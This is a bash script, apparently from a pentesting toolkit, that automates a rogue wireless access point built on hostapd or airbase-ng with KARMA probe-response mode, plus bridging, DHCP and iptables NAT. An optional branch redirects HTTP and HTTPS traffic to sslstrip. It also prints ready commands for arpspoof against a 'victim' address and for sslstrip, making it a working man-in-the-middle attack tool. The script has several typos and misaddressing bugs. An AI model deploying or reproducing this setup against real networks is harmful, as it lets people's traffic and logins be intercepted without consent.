#!/bin/bash

#######################################
# Building a sane working environment #
#######################################

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
	DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
	SOURCE="$(readlink "$SOURCE")"
	[[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

banner()
{ 
	cat $DIR/auth; sleep 3
}

depends()
{
	IPT="/sbin/iptables"
	RESERVD="10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 127.0.0.0/8 169.254.0.0/16"
	DHCP="-t nat"
	LAN2="eth1"
	WAN="-t nat"
	AP="at0"
	MON="wlan0mon"
	VPN="tun0"
	VPNI="tap+"
	OK=`printf "\e[1;32m OK \e[0m"`
	WARN=`printf "\e[1;33m WARNING \e[0m"`
	CRIT=`printf "\e[1;31m WARNING \e[0m"`
	if [ $(whoami) != 'root'  ]; then 
		echo "[$CRIT] Please Run This Script As Root or With Sudo!"
		exit 0
	fi
}

setupenv()
{
	# make sure the env is clean to start with
	prep_host=$(ps -A | grep -i hostapd)
	prep_air=$(ps -A | grep -i airbase)
	prep_dnsmasq=$(ps -A | grep -i dnsmasq)
	prep_mon=$(ip addr | grep -i $MON)
	# Checked for orphaned and lingering processes then sanitize them
	if [ "$prep_host" != "" ]; then echo "[$WARN] Leftover scoobie snacks found! nom nom"; killall hostapd; fi
	if [ "$prep_air" != "" ]; then echo "[$WARN] Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
	if [ "$prep_dnsmasq" != "" ]; then echo "[$WARN] Leftover scoobie snacks found! nom nom"; killall dnsmasq; fi
	if [ "$prep_mon" != "" ]; then echo "[$WARN] Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi
	LAN=eth0 # Prevent early termination errors
	WLAN=wlan0 # Prevent early termination errors
	sessionfolder=/tmp/.n4p #set our tmp working configuration directory and then build config files
	hostapdconf=$sessionfolder/config/hostapd.conf
	if [ ! -d $sessionfolder ]; then mkdir $sessionfolder; fi
	mkdir -p $sessionfolder $sessionfolder/logs $sessionfolder/config
	touch $sessionfolder/config/hostapd.deny $sessionfolder/config/hostapd.accept $sessionfolder/config/hostapd.conf $sessionfolder/logs/hostapd.dump
}

settings()
{
	echo -e "\n
	+===================================+
	| Listing Network Devices           |
	+===================================+"
	ip addr
	echo -e "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
	echo "Press Enter for defaults"
	read -e -p "What is your Internet or default interface? [eth0]: " LAN
	if [ "$LAN" == "" ]; then LAN=eth0; fi
	read -e -p "What is your default Wireless interface? [wlan0]: " WLAN
	if [ "$WLAN" == "" ]; then WLAN=wlan0; fi
	ip link set $WLAN down # No need for extra verification code just force the device down even if it's already down
	sleep 2
	iwconfig $WLAN mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
	read -e -p "AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
	if [ "$ATRIBUTES" != "1" ]; then
		ESSID=\xd8\xae\x20\xcc\xb7\xcc\xb4\xcc\x90\xd8\xae
		CHAN=1
		MTU=7981
		BEACON=100
		PPS=100
	else
		echo "[$WARN] WEP & WPA are supplied in the config file." # I chose not to script them in as most people will not use them
		read -e -p "What SSID Do You Want To Use [Gentoo-AP]: " ESSID
		if [ "$ESSID" == "" ]; then ESSID=\xd8\xae\x20\xcc\xb7\xcc\xb4\xcc\x90\xd8\xae; fi
		read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
		if [ "$CHAN" == "" ]; then CHAN=1; fi
		read -e -p "Select your MTU setting [7981]: " MTU
		if [ "$MTU" == "" ]; then MTU=7981; fi
		read -e -p "Beacon Intervals [100]: " BEACON
		if [ "$BEACON" == "" ]; then BEACON=100
		elif [ "$BEACON" -lt "10" ]; then BEACON=100; fi
		read -e -p "Packets Per Second [100]: " PPS
		if [ "$PPS" == "" ]; then PPS=100; fi
		if [ "$PPS" -lt "100" ]; then PPS=100; fi
	fi
}

keepalive()
{
	read -e -p "[$CRIT] Press ctrl+c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
	if [ "$ALLINTHEFAMILY" != "cuilewhnc78hc4ohfbP7YR;JNd3F92PHBF23" ]; then clear; keepalive; fi
}

killemAll()
{
	echo -e "\n\n[$CRIT] The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
	if [ "$MENUDHCP" == "1" ]; then 
		/etc/init.d/dhcpd stop
		killall dhcpcd
	elif [ "$MENUDHCP" == "2" ]; then  
		killall dnsmasq
		rm /etc/dnsmasq.conf
		mv /etc/dnsmasq.bak /etc/dnsmasq.conf
	fi
	if [[ "$MENUCHOICE" == "1" || "$MENUCHOICE" == "2" ]]; then	
		pkill hostapd
	elif [[ "$MENUCHOICE" == "3" || "$MENUCHOICE" == "4" ]]; then
		pkill airbase-ng
		airmon-zc stop $MON
		#iw dev $MON del "We now require aircrack suite as a dep so replace iw with preferred thorough airmon-zc"
	fi
	if [ "$bridged" == "0" ]; then
		/etc/init.d/net.$BRIDGE stop
		ip link set $BRDIGE down
		brctl delif $BRIDGE $RESP_BR_1
		brctl delif $BRIDGE $RESP_BR_2
		brctl delbr $BRIDGE
		brctl show
	fi
	echo "[$WARN] It's now time to bring your default network interface back up"
	echo -e "\n
	+==================================+
	| 1) Use eth0                      |
	| 2) Use wlan0                     |
	+==================================+"
	read -e -p "Option: " MENUREBUILDNET
	if [ "$MENUREBUILDNET" == "1" ]; then 
		ip link set $LAN up
		/etc/init.d/net.$LAN start
	elif [ "$MENUCHOICE" == "2" ]; then 
		ip link set $WLAN up
		/etc/init.d/net.$WLAN start
	else clear; echo "[$WARN] Invalid option"; dhcp
	fi
	fw_down
	echo "[$OK] The environment is now sanitized cya"
	exit 0
}
trap killemAll INT HUP;

##################################################################
##################Setup for hostapd accesspoint###################
##################################################################
hostapdconfig()
{
	find * -iname "$DIR/hostapd.base" -exec cat {} > $hostapdconf \;
	if [ "$MENUCHOICE" == "1" ]; then echo "enable_karma=1" >> $hostapdconf; else echo "enable_karma=0" >> $hostapdconf; fi
	echo "interface=$WLAN" >> $hostapdconf
	echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
	echo "ssid=$ESSID" >> $hostapdconf
	echo "channel=$CHAN" >> $hostapdconf
	echo "beacon_int=$BEACON" >> $hostapdconf
	echo "accept_mac_file=$sessionfolder/config/hostapd.accept" >> $hostapdconf
	echo "deny_mac_file=$sessionfolder/config/hostapd.deny" >> $hostapdconf
}

starthostapd()
{
	echo "[$OK] STARTING SERVICES:"
	ip link set $WLAN up
	if [ "$bridged" == "1" ]; then
		ip addr add 10.0.0.0/1 broadcast 10.0.0.255 dev $WLAN
		hostapd -dd -B $hostapdconf
		sleep 5
		route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.0 # Needs some time before coming up
	else
		hostapd -dd -B $hostapdconf; sleep 1
	fi
}
##################################################################
###############Setup for Airbase-ng and airmon-zc#################
##################################################################
monitormodestart()
{
	airmon-zc check kill
	airmon-zc start $WLAN
}

startairbase()
{
	if [ $MENUCHOICE = "4" ]; then
		echo -e "\n[$OK] STARTING SERVICE: AIRBASE-NG"
		airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -v > $sessionfolder/logs/airbase-ng.log &
	else
		echo -e "\n[$OK] STARTING SERVICE: KARMA AIRBASE-NG"
		airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
	fi
	sleep 3
	ip link set $AP up
	sleep 1
	if [ "$bridged" == "1" ]; then
		ip addr add 10.0.0.0/1 broadcast 10.0.0.255 dev $AP
		sleep 1
		route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.0
	fi
}
#################################################################
#################Verify our DHCP and bridge needs################
#################################################################
bridge()
{
	read -p "Would you like me to bridge this AP? If no thats ok we can use ip_forward in iptables (y/n) " RESP_BR
	if [ "$RESP_BR" == "y" ]; then
		read -p "[$WARN] Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
		if [ "$BRIDGE" == "" ]; then BRIDGE=br0; fi
		echo -e "[$OK] We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
		echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		ip addr
		echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		read -p "[$WARN] Please tell me the first interface to use: " RESP_BR_1
		if [ "$RESP_BR_1" == "" ]; then RESP_BR_1=$LAN; fi
		read -p "[$WARN] Please tell me the second interface to use: " RESP_BR_2
		if [ "$RESP_BR_2" == "" ]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
			if [[ "$MENUCHOICE" == "3" || "$MENUCHOICE" == "4" ]]; then
				RESP_BR_2=$AP
			else
				RESP_BR_2=$WLAN 
			fi
		fi # Verify and build symlinks for OpenRC, fuck systemd
		if [ -e /etc/init.d/net.$BRIDGE ]; then
			BRIDGE_CHK=$(/etc/init.d/net.$BRIDGE status | sed 's/* status: //g');
			if [ "$BRIDGE_CHK" == "started" ]; then /etc/init.d/net.$BRIDGE stop; sleep 1; ip link set $BRIDGE down; fi
		else
			ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE		
		fi
		if [ -e /etc/init.d/net.$RESP_BR_1 ]; then
			RESP_BR_1_CHK=$(/etc/init.d/net.$RESP_BR_1 status | sed 's/* status: //g');
			if [ "$RESP_BR_1_CHK" == "started" ]; then /etc/init.d/net.$RESP_BR_1 stop; sleep 4; ip link set $RESP_BR_1 down; fi
		else
			ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_1		
		fi
		if [ -e /etc/init.d/net.$RESP_BR_2 ]; then
			RESP_BR_2_CHK=$(/etc/init.d/net.$RESP_BR_2 status | sed 's/* status: //g');
			if [ "$RESP_BR_2_CHK" == "started" ]; then /etc/init.d/net.$RESP_BR_2 stop; sleep 4; ip link set $RESP_BR_2 down; fi
		else
			ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_2		
		fi
		ip addr del 10.0.0.0/1 dev $RESP_BR_2
		iw dev $RESP_BR_2 set 4addr on
		ip link set $RESP_BR_2 up
		ip link set $RESP_BR_1 up
		brctl addbr $BRIDGE
		brctl addif $BRIDGE $RESP_BR_1
		brctl addif $BRIDGE $RESP_BR_2
		ip link set $BRIDGE up
		brctl show
		/etc/init.d/net.$BRIDGE start
		bridged=0
	elif [ "$RESP_BR" != "n" ]; then
		clear
		echo "Invalid option"
		bridge
	else 
		bridged=1
	fi
}

dhcp()
{
	if [ "$BRIDGED" == "1" ]; then
		echo "
		+===================================+
		| 1) Use DHCPD service              |
		| 2) Use DNSMASQ service            |
		+===================================+"
		read -e -p "Option: " MENUDHCP
		if [ "$MENUDHCP" == "1" ]; then 
			dhcpd
		elif [ "$MENUDHCP" == "2" ]; then 
			dnsmasq
		else 
			clear; echo "[$WARN] Invalid option"; dhcp
		fi
	else
		return 0
	fi	
}

dhcpd()
{
	dhcp_verify=$(cat /etc/dhcp/dhcpd.conf | grep -i Pentesters_AP)
	if [ "$dhcp_verify" != "" ]; then
		if [ "$bridged" == "0" ]; then 
			echo "[$OK] Starting bridge now on $BRIDGE"
			/etc/init.d/net.$BRIDGE start
			sleep 5
		elif [ "$bridged" == "1" ]; then 
			echo "[$OK] Starting DHCPD now"
			/etc/init.d/dhcpd restart
		else echo -e "\n* [$CRIT] Critical interface configuration fialure *\n"
		fi
	else
		find * -iname "$DIR/dhcpd.conf" -exec cat {} >> /etc/dhcp/dhcpd.conf \;
		dhcp
	fi
}

dnsmasq()
{
	cp /etc/dnsmasq.conf /etc/dnsmasq.bak
	find * -iname "$DIR/dnsmasq" -exec cat {} >> /etc/dnsmasq.conf \;
	#echo -e "dhcp-authoritative\ninterface=$WLAN\ndhcp-range=$WLAN,10.0.0.0,10.0.0.1,255.255.0.0" >> /etc/dnsmasq.conf "using config file now"
	if [ "$bridged" == "0" ]; then 
		/etc/init.d/net.$BRIDGE start
		sleep 5
	elif [ "$bridged" == "1" ]; then 
		dnsmasq --no-daemon &>/dev/null;
	fi	
}

##################################################################
######################Build the firewall##########################
##################################################################
fw_redundant()
{
	## Flush rules
	echo "[$WARN] Flushing old rules"
	/etc/init.d/iptables stop
	$IPT -F
	$IPT --delete-chain
	$IPT -t nat -F
	$IPT -t nat --delete-chain
	$IPT -t filter --flush FORWARD
	$IPT -t filter --flush INPUT

	# Set default policies for all three default chains
	echo "[$OK] Setting default policies"
	$IPT -P OUTPUT ACCEPT

	echo "[$OK] We will allow ip forwarding"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	$IPT -P FORWARD ACCEPT
	$IPT -F FORWARD

	# Enable free use of loopback interfaces
	echo "[$OK] Allowing loopback devices"
	$IPT -A INPUT -i lo -j ACCEPT
	$IPT -A OUTPUT -o lo -j ACCEPT

	## permit local network
	echo "[$OK] Permit local network"
	$IPT -A INPUT -i $LAN -j ACCEPT
	$IPT -A OUTPUT -o $LAN -j ACCEPT

	## DHCP
	echo "[$OK] Allowing DHCP server"
	$IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT

	## Allow Samba
	echo "[$OK] Configuring Samba"
	$IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT

	read -p "Would you like to enable the configured server services such as ssh httpd? (y/n) " RESP
	if [ "$RESP" == "y" ]; then fw_services; fi # Future add error checking

	read -p "[$OK] Would you like to turn on OpenVPN now? (y/n) " RESP
	if [ "$RESP" == "y" ]; then	fw_vpn;	fi # Future add error checking
}

fw_services()
{
	## Allow DNS Server
	echo "[$OK] Allowing dns on port 53"
	$IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT

	## SSH (allows SSH to firewall, from anywhere on the WAN)
	echo "[$OK] Allowing ssh on port 22"
	$IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT

	## Web server
	echo "[$OK] Allowing http on port 80 and https on 443"
	$IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
	return 0
}

vpn_confirmed()
{
	#Allow TUN interface connections to OpenVPN server
	echo "[$OK] Allowing openVPN"
	$IPT -A INPUT -i $VPN -j ACCEPT
	#allow TUN interface connections to be forwarded through other interfaces
	$IPT -A FORWARD -i $VPN -j ACCEPT
	# Allow TAP interface connections to OpenVPN server
	$IPT -A INPUT -i $VPNI -j ACCEPT
	# Allow TAP interface connections to be forwarded through other interfaces
	$IPT -A FORWARD -i $VPNI -j ACCEPT
	# I've been called into action
	/etc/init.d/openvpn start
}

fw_vpn()
{
	echo "[$WARN] Please pay close attention to the following when considering turning on openvpn."
	echo "[$WARN] The gateway is still broken for dual nics wile hosting services." # Do some work on custom gateway routing for this soon 10-22-2013"
	echo "[$WARN] Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
	echo "[$OK] This will be fixed in the future."
	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time 10-29-2013"
	read -p "[$OK] Do you still want to turn on OpenVPN now? (y/n) " RESP
	if [ "$RESP" = "y" ]; then vpn_confirmed; fi # Future add error checking
}

fw_closure()
{
	## drop everything else arriving from WAN on local interfaces
	echo -e "\n[$OK] Drop everything else"
	$IPT -A INPUT -i $LAN -j LOG
	$IPT -A INPUT -i $LAN -j DROP
	$IPT -A INPUT -i $LAN2 -j LOG
	$IPT -A INPUT -i $LAN2 -j DROP
	#
	# Save settings
	#
	echo "[$OK] Saving settings"
	/etc/init.d/iptables save
	/etc/init.d/iptables start

	## list the iptables rules as confirmation
	echo "[$OK] Listing the iptables rules as confirmation"
	$IPT -L -v
}

fw_up()
{ 
	fw_redundant
	echo -e "[$OK] It's time for specialty hacking configurations"
	echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
	$IPT -t nat -A POSTROUTING -o $LAN -j MASQUERADE
	if [[ "$MENUCHOICE" == "3" || "$MENUCHOICE" == "4" ]]; then
		echo -e "[$OK] Allowing wirless for airbase, routing $AP through $LAN\nbe sure airbase was configured for $AP and $LAN as the output\notherwise adjust these settings"
		$IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
		$IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
	elif [[ "$MENUCHOICE" == "1" || "$MENUCHOICE" == "2" ]]; then
		echo -e "[$OK] Allowing wireless for hostapd, routing $WLAN through $LAN\nbe sure hostapd was configured for $WLAN and $LAN as the output\notherwise adjust these settings"
		$IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
		$IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
	fi
	
	read -p "[$OK] Are we using sslstrip? (y/n) " RESP
	if [ "$RESP" == "y" ]; then
		echo "[$OK] Forwarding nat traffic to sslstrip server on p10000"
		$IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		$IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
		$IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
		$IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
		echo -e "\n[$WARN] Here are some reminders, first setup spoofing. This will be automagic in the future"
		echo -e "\n[$OK] arpspoof -i wlan0/eth0 192.168.1.10 192.168.1.1 \n where 192.168.1.10 is the victim and 192.168.1.1 is the gateway ip address."
		echo -e "\nThis means on this interface intercept traffic from *.10 that is using gateway *.1 \n * now run sslstrip"
		echo -e "\n[$OK] python /usr/lib64/sslstrip/sslstrip.py -k -f lock.ico \n * load sslstrip and use the provided lock.ico icon as a replacement if need be."
		echo -e "\nIf you setup ettercap for MiTM arp spoofing you don't need arpspoof. You must manually edit the ettercap config for this.\n Or just run ettercap and let it sniff arpspoof+sslstrips work"
	fi # Future add error checking
	fw_closure
}

fw_down()
{ 
	fw_redundant
	echo "[$WARN] You are no longer bridged! If you need bridging still you must add that rule yourself."
	echo "[$OK] Defaults loaded for daily use."
	fw_closure
}
##################################################################
########################Start the menu############################
##################################################################
menu()
{
	echo "
	+===================================+
	| 1) HOSTAPD WITH KARMA             |
	| 2) HOSTAPD NO KARMA               |
	| 3) Airbase-NG WITH KARMA          |
	| 4) Airbase-NG NO KARMA            |
	+===================================+"
	read -e -p "Option: " MENUCHOICE
	if [[ "$MENUCHOICE" == "1" || "$MENUCHOICE" == "2" ]]; then hostapdconfig; bridge; starthostapd; dhcp; fw_up; keepalive
	elif [[ "$MENUCHOICE" == "3" || "$MENUCHOICE" == "4" ]]; then monitormodestart; startairbase; sleep 3; bridge; dhcp; fw_up; keepalive
	else clear; echo "[$WARN] Invalid option"; menu
	fi
}
go()
{
	banner
	depends
	setupenv
	settings
	menu
}
go
